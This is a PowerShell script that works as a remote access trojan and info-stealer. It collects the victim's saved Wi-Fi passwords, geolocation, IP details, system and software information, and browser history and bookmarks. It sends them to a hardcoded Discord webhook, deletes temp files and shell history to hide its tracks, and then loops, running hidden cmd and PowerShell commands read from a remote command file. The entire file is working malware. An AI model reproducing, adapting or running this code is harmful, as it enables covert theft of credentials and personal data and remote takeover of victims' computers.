###HEAD
# Set TLS 1.2 as the security protocol
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
#Hide Errors
$ErrorActionPreference = 'SilentlyContinue'
# Define Discord webhook URL
$hookUrl = "https://discord.com/api/webhooks/1200245949126148156/HOwhnUPElKBeBX7_j3WMG8-jMlimPoAM3pTlc-uZMbCESmAPXdzF7YWq1DEYqxxuroKy"
# Define command URL
$url = "C:\Users\MEIR\Desktop\RemoteHack\command.txt"
###/HEAD

###FUNCTIONS
#Define Uploading to discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$text 
    )

    $username = $env:username
    $textChunks = [System.Collections.ArrayList]@()
    $maxChunks = 2  # Maximum number of chunks to send
    $retryCount = 0
    $retryDelay = 2  # Standard delay between retries, in seconds

    # Split text into chunks of 2000 characters
    while ($text.Length -gt 0 -and $textChunks.Count -lt $maxChunks) {
        $chunk = $text.Substring(0, [Math]::Min(2000, $text.Length))
        $textChunks.Add($chunk)
        $text = $text.Substring($chunk.Length)
    }

    # Send each chunk as a separate message with a delay
    foreach ($chunk in $textChunks) {
        try {
            $Body = @{
                'username' = $username
                'content' = $chunk
            }

            Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookUrl -Method Post -Body ($Body | ConvertTo-Json)
            
            # Introduce a delay (adjust as needed)
            Start-Sleep -Seconds 2
        }
        catch {
            $retryCount++
            Write-Host "Error sending message (Retry $retryCount): $_"
            
            if ($_.Exception.Response -is [System.Net.HttpWebResponse]) {
                $response = $_.Exception.Response
                if ($response.StatusCode -eq [System.Net.HttpStatusCode]::TooManyRequests) {
                    $retryAfter = [int]$response.Headers['Retry-After']
                    Write-Host "Rate limited. Retrying after $retryAfter seconds..."
                    Start-Sleep -Seconds $retryAfter
                }
                else {
                    $retryDelay = [int]$response.Headers['Retry-After']
                    Write-Host "Retrying after $retryDelay seconds..."
                    Start-Sleep -Seconds $retryDelay
                }
            }
            else {
                Write-Host "Retrying after a standard delay..."
                Start-Sleep -Seconds $retryDelay
            }

            # Modify username if the message wasn't accepted
            $username = "$username 0"
        }
    }
}
#leave no trace
function LeaveNoTrace {
    # Remove files in the TEMP directory
    Remove-Item $env:TEMP\* -Recurse -Force
    # Clear recent Run history in Windows Registry
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    # Remove PowerShell history file
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
    # Clear the Recycle Bin
    Clear-RecycleBin -Force
}
# Get GeoLocation
function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
        $GeoWatcher.Start() #Begin resolving current location

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100 #Wait for discovery.
        }  

        if ($GeoWatcher.Permission -eq 'Denied'){
            Write-Error 'Access Denied for Location Information'
        } else {
            $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
            $GL = $GL -split " "
            $Lat = $GL[0].Substring(11) -replace ".$"
            $Lon = $GL[1].Substring(10) -replace ".$" 
            return $Lat, $Lon
        }
    }
    # Write Error is just for troubleshooting
    catch {
        Write-Error "No coordinates found" 
        return "No Coordinates found"
        -ErrorAction SilentlyContinue
    } 
}
# Get browserData
function Get-BrowserData {

    [CmdletBinding()]
    param (    
        [Parameter(Position=1, Mandatory=$True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    # List of supported browsers
    $SupportedBrowsers = @(
        'chrome',
        'edge',
        'firefox'
        # Add other supported browsers as needed
    )

    $ResultArray = @()

    foreach ($Browser in $SupportedBrowsers) {
        $Path = Get-BrowserPath -Browser $Browser -DataType $DataType

        if ($Path -ne $null) {
            $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort-Object -Unique

            $Value | ForEach-Object {
                $ResultArray += New-Object -TypeName PSObject -Property @{
                    User = $env:UserName
                    Browser = $Browser
                    DataType = $DataType
                    Data = $_
                }
            }
        }
    }

    return $ResultArray
}
# Get BrowserPath
function Get-BrowserPath {
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,
        [Parameter(Position=2, Mandatory=$True)]
        [string]$DataType
    )

    switch ($Browser) {
        'chrome' {
            if ($DataType -eq 'history') {
                return "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
            }
            elseif ($DataType -eq 'bookmarks') {
                return "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
            }
        }
        'edge' {
            if ($DataType -eq 'history') {
                return "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
            }
            elseif ($DataType -eq 'bookmarks') {
                return "$env:USERPROFILE\AppData\Local\Mozilla\Edge\User Data\Default\Bookmarks"
            }
        }
        'firefox' {
            if ($DataType -eq 'history') {
                return "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
            }
        }
        # Add additional cases for other browsers as needed
    }

    Write-Warning "Unsupported browser or data type."
    return $null
}
###/FUNCTIONS

###BROADCAST
# Organize collected data
$allBrowserHistory = Get-BrowserData -DataType 'history' | Out-String
$allBrowserBookmarks = Get-BrowserData -DataType 'bookmarks' | Out-String
$allBrowserData = "HISTORY:`n`n`n`n`n" + $allBrowserHistory + "BOOKMARKS:`n`n`n`n`n" + $allBrowserBookmarks
$Lat, $Lon = Get-GeoLocation
$Location = "Latitude: $Lat, Longitude: $Lon"
$ip = Invoke-Expression 'ipconfig' | Out-String
$ipv4Address = (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
$wifi = (netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" } | ForEach-Object { netsh wlan show profiles $_ key=clear | Select-String "SSID name", "Key Content" }) -join "`n"
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$software = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion)
$computerSystem = Invoke-Expression 'Get-WmiObject Win32_ComputerSystem' | Out-String
#Final result:
$data = "Username: " + $env:USERNAME + "`nComputer name: " + $env:COMPUTERNAME + "`nDisc location: " + $env:USERPROFILE + "`nComputer system: " + $computerSystem + "`nOS: " + $os + "`n`n`nLocation: " + $Location + "`n`nIPv4: " + $ipv4Address + "`nMore IP info: " + $ip + "`nWifi password(s):`n" + $wifi + "`n`n`n`n`nBROWSERDATA:`n$allBrowserData"
# Broadcast final result
Upload-Discord -text "$data"
###/BROADCAST

###GETCOMMANDS
function CustomLanguageInterpreter {
    param(
        [string]$command
    )

    # Split the input text into lines
    $lines = $command -split "`n"

    foreach ($line in $lines) {
        # Check if the line is not null or empty and starts with '!'
        if ($line -and $line -match '^!(\w+)(?:\s+(.+))?') {
            $commandType = $matches[1]
            $code = $matches[2]

            # Construct the command string
            switch ($commandType) {
                'cmd' {
Start-Process cmd -ArgumentList "/c `$output=$($code | Invoke-Expression); Upload-Discord -text ""Executed Code:`n $code`nResult:`n`$output""" -WindowStyle Hidden
                }
                'powershell' {
Start-Process powershell -ArgumentList "-NoProfile -Command `$output = $($code | Invoke-Expression); Upload-Discord -text ""Executed Code:`n $code`nResult:`n`$output""" -WindowStyle Hidden -NoNewWindow
                }
'msgbox' {
    # Run the PowerShell code to display the MessageBox
    Invoke-Expression $code

    # Construct the PowerShell code for displaying MessageBox
    $psCode = @"
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show('$msgBoxMessage', '$msgBoxTitle', [System.Windows.MessageBoxButton]::$msgBoxButton, [System.Windows.MessageBoxImage]::$msgBoxIcon)
"@

    # Run the PowerShell code to display the MessageBox
    Invoke-Expression $psCode

    # Upload to Discord or perform any other actions
    Upload-Discord -text "Executed code: $code`nMessageBox displayed"
                }
                default {
                    Write-Host "Unknown Command: $commandType"
                    Upload-Discord -text "Write-Host 'Unknown Command: $commandType'"
                }
            }
        }
    }
}

function Check-FileContent {
    # Get the initial content of the file
    $previousContent = (Invoke-RestMethod -Uri $url).ToString()

    # Log the initial content
    Write-Output "Initial File Contents:"
    Write-Output $previousContent

    # Run the CustomLanguageInterpreter with the initial content
    CustomLanguageInterpreter -command $previousContent

    # Loop to continuously check for changes
    while ($true) {
        # Get the current content of the file
        $currentContent = (Invoke-RestMethod -Uri $url).ToString()

        # Check if content has changed
        if ($previousContent -ne $currentContent) {
            # Log the difference
            Write-Output "File content has changed:"
            Write-Output $currentContent

            # Run the CustomLanguageInterpreter with the updated content
            CustomLanguageInterpreter -command $currentContent

            # Update the previous content
            $previousContent = $currentContent
        }

        # Introduce a delay between checks (adjust as needed)
        Start-Sleep -Seconds 5
    }
}

# Run the function separately
Check-FileContent
